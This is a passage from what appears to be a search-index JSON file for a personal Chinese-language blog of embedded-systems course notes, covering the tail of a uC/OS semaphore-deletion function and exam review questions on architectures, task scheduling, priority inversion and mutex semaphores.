OS_STAT_SEM); } pevent->OSEventType = OS_EVENT_TYPE_UNUSED; pevent->OSEventFreeList; OSEventFreeList = pevent; //\u91ca\u653e\u8be5\u4fe1\u53f7\u91cf\u7684ECB\u56de\u7a7a\u95f2\u63a7\u5236\u5757\u94fe if (tasks_waiting == TRUE) { OS_Sched(); } //\u5982\u679c\u4e4b\u524d\u6709\u4efb\u52a1\u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6 *err = OS_NO_ERR; return ((OS_EVENT*)0); default: *err = OS_ERR_INVALID_OPT; return (pevent); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.4. \u5220\u9664\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/7.uCos%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%97%B6%E9%97%B4%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","text":"uCos\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406 # \u76ee\u5f55 # uCos\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406 \u76ee\u5f55 1. \u80cc\u666f 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002","title":"7.uCos\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/7.uCos%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%97%B6%E9%97%B4%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#ucos","text":"","title":"uCos\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/7.uCos%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%97%B6%E9%97%B4%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#_1","text":"uCos\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406 \u76ee\u5f55 1. \u80cc\u666f","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/7.uCos%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%97%B6%E9%97%B4%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#1","text":"\u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4e2d\u65ad\u65f6\u95f4\u548c\u5185\u5b58\u7ba1\u7406\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/","text":"\u5d4c\u5165\u5f0f\u7cfb\u7edf\u590d\u4e60\u9898 # \u76ee\u5f55 # \u5d4c\u5165\u5f0f\u7cfb\u7edf\u590d\u4e60\u9898 \u76ee\u5f55 1. \u80cc\u666f 2. \u9898\u76ee 2.1. \u5d4c\u5165\u5f0f\u7cfb\u7edf\u57fa\u7840 2.2. \u4efb\u52a1\u7ba1\u7406\u4e0e\u8c03\u5ea6 2.3. \u4e2d\u65ad 2.4. \u540c\u6b65\u4e92\u65a5\u548c\u901a\u4fe1 2.5. \u5185\u6838\u79fb\u690d 1. \u80cc\u666f # \u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u6211\u628a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u4e60\u9898\u6574\u7406\u4e86\u4e00\u4e0b\uff0c\u6574\u7406\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002 2. \u9898\u76ee # 2.1. \u5d4c\u5165\u5f0f\u7cfb\u7edf\u57fa\u7840 # \u4ec0\u4e48\u662f\u5d4c\u5165\u5f0f\u7cfb\u7edf\uff1f\u4e3e\u4f8b\u8bf4\u660e\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u5178\u578b\u5e94\u7528\u3002 \u5d4c\u5165\u5f0f\u7cfb\u7edf\u662f\u201c\u7528\u4e8e\u63a7\u5236\u3001\u76d1\u89c6\u6216\u8005\u8f85\u52a9\u64cd\u4f5c\u673a\u5668\u548c\u8bbe\u5907\u7684\u88c5\u7f6e\u201d\uff08\u539f\u6587\u4e3adevices used to control, monitor, or assist the operation of equipment, machinery or plants\uff09\u3002 \u5178\u578b\u7684\u5e94\u7528\u5982\uff1a\u51b0\u7bb1\u3001\u6d17\u8863\u673a\u3001\u7a7a\u8c03\u3001\u5de5\u4e1a\u673a\u5668\u4eba\u3001\u667a\u80fd\u95e8\u7981\u3001\u6c7d\u8f66\u7535\u5b50\u3001\u5171\u4eab\u5355\u8f66\u7b49\u7b49\u3002 \u5d4c\u5165\u5f0f\u5fae\u5904\u7406\u5668\u6709\u54ea\u4e24\u79cd\u67b6\u6784\uff1f\u533a\u522b\u662f\u4ec0\u4e48\u3002 \u51af\u00b7\u8bfa\u4f0a\u66fc\u7ed3\u6784\u548c\u54c8\u4f5b\u7ed3\u6784\u3002 \u51af\u00b7\u8bfa\u4f0a\u66fc\u7ed3\u6784\u8f83\u4e3a\u7b80\u5355\uff0c\u6210\u672c\u4f4e\uff0c\u8fd0\u7b97\u901f\u5ea6\u6bd4\u54c8\u4f5b\u7ed3\u6784\u6162\u3002 \u54c8\u4f5b\u7ed3\u6784\u80fd\u591f\u9ad8\u901f\u5904\u7406\u6570\u636e\uff0c\u53ef\u4ee5\u540c\u65f6\u8bfb\u53d6\u5206\u5f00\u5b58\u50a8\u7684\u6307\u4ee4\u548c\u6570\u636e\uff0c\u4f46\u7ed3\u6784\u6bd4\u8f83\u590d\u6742\uff0c\u6210\u672c\u9ad8\u3002 \u51af\u00b7\u8bfa\u4f9d\u66fc\u7406\u8bba\u7684\u8981\u70b9\u662f\uff1a\u6570\u5b57\u8ba1\u7b97\u673a\u7684\u6570\u5236\u91c7\u7528\u4e8c\u8fdb\u5236\uff1b\u8ba1\u7b97\u673a\u5e94\u8be5\u6309\u7167\u7a0b\u5e8f\u987a\u5e8f\u6267\u884c\u3002\u4eba\u4eec\u628a\u51af\u8bfa\u4f9d\u66fc\u7684\u8fd9\u4e2a\u7406\u8bba\u79f0\u4e3a\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002\u4eceENIAC\u5230\u5f53\u524d\u6700\u5148\u8fdb\u7684\u8ba1\u7b97\u673a\u90fd\u91c7\u7528\u7684\u662f\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002\u6240\u4ee5\u51af\u8bfa\u4f9d\u66fc\u662f\u5f53\u4e4b\u65e0\u6127\u7684\u6570\u5b57\u8ba1\u7b97\u673a\u4e4b\u7236\u3002 \u6570\u5b66\u5bb6\u51af\u00b7\u8bfa\u4f9d\u66fc\u63d0\u51fa\u4e86\u8ba1\u7b97\u673a\u5236\u9020\u7684\u4e09\u4e2a\u57fa\u672c\u539f\u5219\uff0c\u5373\u91c7\u7528\u4e8c\u8fdb\u5236\u903b\u8f91\u3001\u7a0b\u5e8f\u5b58\u50a8\u6267\u884c\u4ee5\u53ca\u8ba1\u7b97\u673a\u7531\u4e94\u4e2a\u90e8\u5206\u7ec4\u6210\uff08\u8fd0\u7b97\u5668\u3001\u63a7\u5236\u5668\u3001\u5b58\u50a8\u5668\u3001\u8f93\u5165\u8bbe\u5907\u3001\u8f93\u51fa\u8bbe\u5907\uff09\uff0c\u8fd9\u5957\u7406\u8bba\u88ab\u79f0\u4e3a\u51af\u00b7\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002 \u6839\u636e\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u6784\u6210\u7684\u8ba1\u7b97\u673a\uff0c\u5fc5\u987b\u5177\u6709\u5982\u4e0b\u529f\u80fd\uff1a \u628a\u9700\u8981\u7684\u7a0b\u5e8f\u548c\u6570\u636e\u9001\u81f3\u8ba1\u7b97\u673a\u4e2d\uff1b \u5fc5\u987b\u5177\u6709\u957f\u671f\u8bb0\u5fc6\u7a0b\u5e8f\u3001\u6570\u636e\u3001\u4e2d\u95f4\u7ed3\u679c\u53ca\u6700\u7ec8\u8fd0\u7b97\u7ed3\u679c\u7684\u80fd\u529b\uff1b \u80fd\u591f\u5b8c\u6210\u5404\u79cd\u7b97\u672f\u3001\u903b\u8f91\u8fd0\u7b97\u548c\u6570\u636e\u4f20\u9001\u7b49\u6570\u636e\u52a0\u5de5\u5904\u7406\u7684\u80fd\u529b\uff1b \u80fd\u591f\u6839\u636e\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u8d70\u5411\uff0c\u5e76\u80fd\u6839\u636e\u6307\u4ee4\u63a7\u5236\u673a\u5668\u7684\u5404\u90e8\u4ef6\u534f\u8c03\u64cd\u4f5c\uff1b \u80fd\u591f\u6309\u7167\u8981\u6c42\u5c06\u5904\u7406\u7ed3\u679c\u8f93\u51fa\u7ed9\u7528\u6237\u3002 \u54c8\u4f5b\u7ed3\u6784\u662f\u4e3a\u4e86\u9ad8\u901f\u6570\u636e\u5904\u7406\u800c\u91c7\u7528\u7684\uff0c\u56e0\u4e3a\u53ef\u4ee5\u540c\u65f6\u8bfb\u53d6\u6307\u4ee4\u548c\u6570\u636e\uff08\u5206\u5f00\u5b58\u50a8\u7684\uff09\u3002\u5927\u5927\u63d0\u9ad8\u4e86\u6570\u636e\u541e\u5410\u7387\uff0c\u7f3a\u70b9\u662f\u7ed3\u6784\u590d\u6742 \u3002\u901a\u7528\u5fae\u673a\u6307\u4ee4\u548c\u6570\u636e\u662f\u6df7\u5408\u5b58\u50a8\u7684\uff0c\u7ed3\u6784\u4e0a\u7b80\u5355\uff0c\u6210\u672c\u4f4e\u3002\u5047\u8bbe\u662f\u54c8\u4f5b\u7ed3\u6784\uff1a\u4f60\u5c31\u5f97\u5728\u7535\u8111\u5b89\u88c5\u4e24\u5757\u786c\u76d8\uff0c\u4e00\u5757\u88c5\u7a0b\u5e8f\uff0c\u4e00\u5757\u88c5\u6570\u636e\uff0c\u5185\u5b58\u88c5\u4e24\u6839\uff0c\u4e00\u6839\u50a8\u5b58\u6307\u4ee4\uff0c\u4e00\u6839\u5b58\u50a8\u6570\u636e\u2026\u2026 \u54c8\u4f5b\u7ed3\u6784\u5904\u7406\u5668\u6709\u4e24\u4e2a\u660e\u663e\u7684\u7279\u70b9\uff1a\u4f7f\u7528\u4e24\u4e2a\u72ec\u7acb\u7684\u5b58\u50a8\u5668\u6a21\u5757\uff0c\u5206\u522b\u5b58\u50a8\u6307\u4ee4\u548c\u6570\u636e\uff0c\u6bcf\u4e2a\u5b58\u50a8\u6a21\u5757\u90fd\u4e0d\u5141\u8bb8\u6307\u4ee4\u548c\u6570\u636e\u5e76\u5b58\uff1b\u4f7f\u7528\u72ec\u7acb\u7684\u4e24\u6761\u603b\u7ebf\uff0c\u5206\u522b\u4f5c\u4e3aCPU\u4e0e\u6bcf\u4e2a\u5b58\u50a8\u5668\u4e4b\u95f4\u7684\u4e13\u7528\u901a\u4fe1\u8def\u5f84\uff0c\u800c\u8fd9\u4e24\u6761\u603b\u7ebf\u4e4b\u95f4\u6beb\u65e0\u5173\u8054\u3002 \u6539\u8fdb\u7684\u54c8\u4f5b\u7ed3\u6784\uff0c\u5176\u7ed3\u6784\u7279\u70b9\u4e3a\uff1a\u4ee5\u4fbf\u5b9e\u73b0\u5e76\u884c\u5904\u7406\uff1b\u5177\u6709\u4e00\u6761\u72ec\u7acb\u7684\u5730\u5740\u603b\u7ebf\u548c\u4e00\u6761\u72ec\u7acb\u7684\u6570\u636e\u603b\u7ebf\uff0c\u5229\u7528\u516c\u7528\u5730\u5740\u603b\u7ebf\u8bbf\u95ee\u4e24\u4e2a\u5b58\u50a8\u6a21\u5757\uff08\u7a0b\u5e8f\u5b58\u50a8\u6a21\u5757\u548c\u6570\u636e\u5b58\u50a8\u6a21\u5757\uff09\uff0c\u516c\u7528\u6570\u636e\u603b\u7ebf\u5219\u88ab\u7528\u6765\u5b8c\u6210\u7a0b\u5e8f\u5b58\u50a8\u6a21\u5757\u6216\u6570\u636e\u5b58\u50a8\u6a21\u5757\u4e0eCPU\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u3002 \u662f\u4ec0\u4e48\u7ed3\u6784\u8981\u770b\u603b\u7ebf\u7ed3\u6784\u7684\u300251\u5355\u7247\u673a\u867d\u7136\u6570\u636e\u6307\u4ee4\u5b58\u50a8\u533a\u662f\u5206\u5f00\u7684\uff0c\u4f46\u603b\u7ebf\u662f\u5206\u65f6\u590d\u7528\u7684\uff0c\u6240\u4ee5\u9876\u591a\u7b97\u6539\u8fdb\u578b\u7684\u54c8\u4f5b\u7ed3\u6784\u3002ARM9\u867d\u7136\u662f\u54c8\u4f5b\u7ed3\u6784\uff0c\u4f46\u662f\u4e4b\u524d\u7684\u7248\u672c\u4e5f\u8fd8\u662f\u51af\u00b7\u8bfa\u4f9d\u66fc\u7ed3\u6784\u3002\u65e9\u671f\u7684X86\u80fd\u8fc5\u901f\u5360\u6709\u5e02\u573a\uff0c\u4e00\u6761\u5f88\u91cd\u8981\u7684\u539f\u56e0\uff0c\u6b63\u662f\u9760\u4e86\u51af\u00b7\u8bfa\u4f9d\u66fc\u8fd9\u79cd\u5b9e\u73b0\u7b80\u5355\uff0c\u6210\u672c\u4f4e\u7684\u603b\u7ebf\u7ed3\u6784\u3002\u5904\u7406\u5668\u867d\u7136\u5916\u90e8\u603b\u7ebf\u4e0a\u770b\u662f\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u5185\u90e8CACHE\u7684\u5b58\u5728\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u5185\u90e8\u6765\u770b\u5df2\u7ecf\u7b97\u662f\u6539\u8fdb\u578b\u54c8\u4f5b\u7ed3\u6784\u7684\u4e86\u3002 \u6bd4\u8f83ucos\u548cuClinux\u7684\u5185\u6838\u7279\u70b9\uff0c\u4e3e\u4f8b\u8bf4\u660e\u5176\u5404\u81ea\u9002\u7528\u7684\u573a\u5408\u3002 uc/os\u9002\u5408\u5c0f\u578b\u63a7\u5236\u7cfb\u7edf\uff0c\u5177\u6709\u6267\u884c\u6548\u7387\u9ad8\u3001\u5360\u7528\u7a7a\u95f4\u5c0f\u3001\u5b9e\u65f6\u6027\u80fd\u4f18\u826f\u548c\u53ef\u6269\u5c55\u6027\u5f3a\u7b49\u7279\u70b9\uff0c\u6700\u5c0f\u5185\u6838\u53ef\u7f16\u8bd1\u81f32k\u3002 uclinux\u5219\u662f\u7ee7\u627f\u6807\u51c6linux\u7684\u4f18\u826f\u7279\u6027\uff0c\u9488\u5bf9\u5d4c\u5165\u5f0f\u5904\u7406\u5668\u7684\u7279\u70b9\u8bbe\u8ba1\u7684\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5177\u6709\u5185\u5d4c\u7f51\u7edc\u534f\u8bae\u3001\u652f\u6301\u591a\u79cd\u6587\u4ef6\u7cfb\u7edf\uff0c\u5f00\u53d1\u8005\u53ef\u5229\u7528\u6807\u51c6linux\u5148\u9a8c\u77e5\u8bc6\u7b49\u4f18\u52bf\u3002 \u5c0f\u578b\u63a7\u5236\u7cfb\u7edf\u53ef\u5145\u5206\u5229\u7528uc/os\u5c0f\u5de7\u4e14\u5b9e\u65f6\u6027\u5f3a\u7684\u4f18\u52bf\uff0c\u5982\u679c\u5f00\u53d1pda\u548c\u4e92\u8054\u7f51\u8fde\u63a5\u7ec8\u7aef\u7b49\u8f83\u4e3a\u590d\u6742\u7684\u7cfb\u7edf\u5219uclinux\u662f\u4e0d\u9519\u7684\u3002 2.2. \u4efb\u52a1\u7ba1\u7406\u4e0e\u8c03\u5ea6 # \u6bcf\u4e00\u4e2a\u4efb\u52a1\u90fd\u662f\u662f\u4e00\u4e2a\u6b7b\u5faa\u73af True \u5d4c\u5165\u5f0flinux\u662f\u57fa\u4e8e\u65f6\u95f4\u7247\u8c03\u5ea6\u7684\u5185\u6838 True ucos-ii\u662f\u5360\u5148\u5f0f\u7684\u5185\u6838\uff0c\u4e0d\u652f\u6301\u65f6\u95f4\u7247\u7ba1\u7406\u3002\u5b9e\u65f6\u6027\u9ad8\u4e8e\u5d4c\u5165\u5f0flinux\u5185\u6838\u3002 True \u6240\u6709\u7684\u4efb\u52a1\u90fd\u662f\u5468\u671f\u6027\u6267\u884c\u7684 True \u6bcf\u4e2a\u4efb\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u5806\u6808\u548c\u4efb\u52a1\u63a7\u5236\u5757\u3002\u8fd9\u4e9b\u8d44\u6e90\u5360\u7528\u7684\u662fRAM\u8d44\u6e90\u3002 True \u4efb\u52a1\u7684\u72b6\u6001\u6709\u54ea\u4e9b\uff1f \u4f11\u7720\u6001 \u5c31\u7eea\u6001 \u8fd0\u884c\u6001 \u7b49\u5f85\u6001 \u4e2d\u65ad\u670d\u52a1\u6001 \u7b80\u8ff0ucos-II \u4efb\u52a1\u7684\u5207\u6362\u8fc7\u7a0b \u8c03\u7528\u4efb\u52a1\u5207\u6362\u51fd\u6570OSSched() \u68c0\u67e5\u5f53\u524d\u662f\u5426\u5728\u4e2d\u65ad\u4e2d\uff0c\u68c0\u67e5\u8c03\u5ea6\u5668\u662f\u5426\u88ab\u9501 \u5173\u4e2d\u65ad \u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u548c\u8be5\u4f18\u5148\u7ea7\u4e0b\u5bf9\u5e94\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1 \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u662f\u4e00\u6837\u7684 \u88ab\u5207\u6362\u5230\u7684\u4efb\u52a1\u7684\u5207\u6362\u6b21\u6570\u52a0\u4e00 \u603b\u7684\u4efb\u52a1\u5207\u6362\u6b21\u6570\u52a0\u4e00 \u8c03\u7528\u4efb\u52a1\u5207\u6362\u7684\u5b8fOS_TASK_SW() \u5f00\u4e2d\u65ad Q\uff1aExplain the principle of priority inversion according to the figure above\u3002 Task 1 has a higher priority Task 2 has a middle priority Task 3 has a lower priority \u7b54\u6848\uff1a \u4f18\u5148\u7ea7\u53cd\u8f6c\uff1a\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8fd0\u884c\u3002 \u4ece\u56fe\u4e2d\u770b\uff0c\u4e09\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u6392\u5217\u662f Task 1 > Task 2 > Task 3\u3002 \u5728(3)\u9636\u6bb5\uff0c\u4efb\u52a13\u5360\u636e\u4e86\u4fe1\u53f7\u91cf\uff0c\u5728(4)\u9636\u6bb5\uff0c\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u4efb\u52a11\u62a2\u5360\u4e86\u4efb\u52a13\uff0c\u5e76\u5728(6)\u5c1d\u8bd5\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c \u4f46\u7531\u4e8e\u4fe1\u53f7\u91cf\u5df2\u88ab\u4efb\u52a13\u5360\u636e\uff0c\u8d44\u6e90\u4e0d\u8db3\uff0c\u4efb\u52a11\u88ab\u6302\u8d77\uff0c\u4f18\u5148\u7ea7\u964d\u4f4e\u3002 \u800c\u5728(8)\u9636\u6bb5\u4efb\u52a12\u56e0\u4e3a\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u62a2\u5360\u4e86\u4efb\u52a13\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c\u6210\u529f\u8fd0\u884c\u3002 \u6240\u4ee5\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u53ea\u6709\u4e2d\u4f18\u5148\u7ea7\u7684\u4efb\u52a12\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a11\u8fd0\u884c\u3002 \u8fd9\u4e0e\u6211\u4eec\u6240\u671f\u671b\u7684\uff0c\u4f18\u5148\u7ea7\u9ad8\u7684\u4efb\u52a1\u5148\u8fd0\u884c\u7684\u76ee\u6807\u4e0d\u76f8\u7b26\uff0c\u6240\u4ee5\u5c31\u4ea7\u751f\u4e86\u95ee\u9898\u3002 To avoid priority inversion\uff0cthe Kernel has the feature \"Mutual Exclusion Semaphores\", explain how it works according to the following sequence diagram. \u7b54\u6848\uff1a \u8981\u89e3\u51b3\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\uff0c\u6709\u4e24\u79cd\u65b9\u6848\uff0c\u5206\u522b\u662f\u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u3002 \u8fd9\u91cc\u4f7f\u7528\u4e86\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u7b56\u7565\uff0c\u5728\u4efb\u52a13\u5360\u6709\u4e86\u4e92\u65a5\u4fe1\u53f7\u91cf\u5e76\u963b\u585e\u4e86\u4efb\u52a11\u7684\u65f6\u5019\uff0c\u4efb\u52a13\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u9ad8\u5230\u548c\u4efb\u52a11\u76f8\u540c\u3002 \u6240\u4ee5\u4efb\u52a13\u6267\u884c\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u88ab\u4efb\u52a12\u62a2\u5360\u3002 \u5f53\u4efb\u52a13\u6267\u884c\u5b8c\u6bd5\uff0c\u91ca\u653e\u4e92\u65a5\u4fe1\u53f7\u91cf\u65f6\uff0c\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a11\u83b7\u53d6\u4e86\u4fe1\u53f7\u91cf\uff0c\u5f00\u59cb\u8fd0\u884c\u3002 \u6709\u5173\u4efb\u52a1\u7684\u63a7\u5236\u5757(TCB)\u63cf\u8ff0\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u6bcf\u4e2a\u4efb\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u63a7\u5236\u5757\u3002 B. TCB\u662f\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4fdd\u5b58\u4efb\u52a1\u7684\u4fe1\u606f\u3002 C. ucos\u4e2d\uff0cTCB\u662f\u53cc\u8054\u8868\u7ba1\u7406\u7684\u3002\u521b\u5efa\u4efb\u52a1\u65f6\u4ece\u7a7a\u95f2\u94fe\u83b7\u5f97\u4e00\u4e2aTCB\u5206\u914d\u7ed9\u5f53\u524d\u4efb\u52a1 D.\u4efb\u52a1\u5207\u6362\u65f6\uff0c\u5f53\u524d\u4efb\u52a1\u7684TCB\u662f\u4e0d\u7528\u4fdd\u62a4\u7684\u3002 \u7b54\u6848\uff1aABC \u4efb\u52a1\u7684\u4fe1\u606f\u5305\u62ec\uff1a A. \u4fdd\u5b58\u6bcf\u4e2a\u4efb\u52a1\u7684\u4fe1\u606f\u6240\u7528\u7684\u5185\u5b58\u5927\u5c0f\u90fd\u662f\u76f8\u540c\u7684\u3002 B. \u4fe1\u606f\u4e2d\u5305\u62ec\u4efb\u52a1\u7684ID C. \u4efb\u52a1\u7684\u72b6\u6001 D. \u4efb\u52a1\u7684\u5806\u6808\u6307\u9488 \u7b54\u6848\uff1a ABCD \u5360\u5148\u5f0f\u5185\u6838\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u53ef\u4ee5\u88ab\u4e2d\u65ad\u6253\u65ad B. \u4ece\u4e2d\u65ad\u8fd4\u56de\u65f6\uff0c\u53ef\u4ee5\u53d1\u751f\u4efb\u52a1\u8c03\u5ea6 C. \u4ece\u4e2d\u65ad\u8fd4\u56de\u65f6\uff0c\u8fd4\u56de\u5230\u65ad\u70b9\uff0c\u5373\u88ab\u4e2d\u65ad\u7684\u4efb\u52a1\u5904\uff0c\u7ee7\u7eed\u6267\u884c D. \u6709\u4f18\u5148\u7ea7\u9ad8\u7684\u4efb\u52a1\u5c31\u7eea\u65f6\uff0c\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u88ab\u62a2\u5360 \u7b54\u6848\uff1a ABD \u6709\u5173\u4e34\u754c\u8d44\u6e90\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u4e34\u754c\u8d44\u6e90\u5373\u4e3a\u4e34\u754c\u533a B. \u53ef\u4ee5\u901a\u8fc7\u4e92\u65a5\u673a\u5236\u4fdd\u62a4\u4e34\u754c\u8d44\u6e90 C. \u4e0d\u53ef\u4ee5\u7531\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u8bbf\u95ee\u7684\u8d44\u6e90 D. \u4e34\u754c\u8d44\u6e90\u53ef\u4ee5\u662f\u5b9a\u4e49\u7684\u4e00\u4e2a\u53d8\u91cf \u7b54\u6848\uff1a BCD ucos\u6709\u5173\u4efb\u52a1\u7684\u521b\u5efa\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u521b\u5efa\u4efb\u52a1\u524d\u5fc5\u987b\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u3002 B. \u521b\u5efa\u4efb\u52a1\u65f6\u5fc5\u987b\u6307\u5b9a\u5176\u4f18\u5148\u7ea7\uff0c\u4e14\u5fc5\u987b\u552f\u4e00\u3002 C. \u521b\u5efa\u4efb\u52a1\u540e\uff0c\u8be5\u4efb\u52a1\u5373\u5904\u4e8e\u5c31\u7eea\u6001\u3002 D. \u521b\u5efa\u4efb\u52a1\u65f6\uff0c\u4ece\u7a7a\u95f2\u94fe\u8868\u83b7\u5f97\u4e00\u4e2aTCB\uff0c\u8fdb\u884c\u521d\u59cb\u5316 \u7b54\u6848\uff1a ABCD \u4fe1\u53f7\u91cf\u7684\u91ca\u653e\u662f\u7531\u5185\u6838\u5b9e\u73b0\u7684 False \u4efb\u52a1\u53ef\u4ee5\u81ea\u5df1\u6302\u8d77\uff0c\u5e76\u5b9e\u73b0\u8c03\u5ea6 True \u6302\u8d77\u4efb\u52a1\u548c\u89e3\u6302\u4efb\u52a1\u7684\u51fd\u6570\u5fc5\u987b\u662f\u6210\u5bf9\u51fa\u73b0\u7684\uff0c\u5426\u5219\u4f1a\u9020\u6210\u6b7b\u9501 True \u4efb\u52a1\u8c03\u5ea6\u4ee5\u8c03\u5ea6\u51fd\u6570\u5b9e\u73b0\u3002\u4efb\u52a1\u8c03\u5ea6\u662f\u7cfb\u7edf\u7684\u4e00\u4e2a\u4efb\u52a1\u3002 False \u4efb\u52a1\u7684\u5524\u9192\u662f\u4e0d\u9700\u8981\u8c03\u5ea6\u7684\u3002 False ucos\u7684\u6bcf\u4e00\u4e2a\u4efb\u52a1\u90fd\u662f\u4e00\u4e2a\u6b7b\u5faa\u73af True 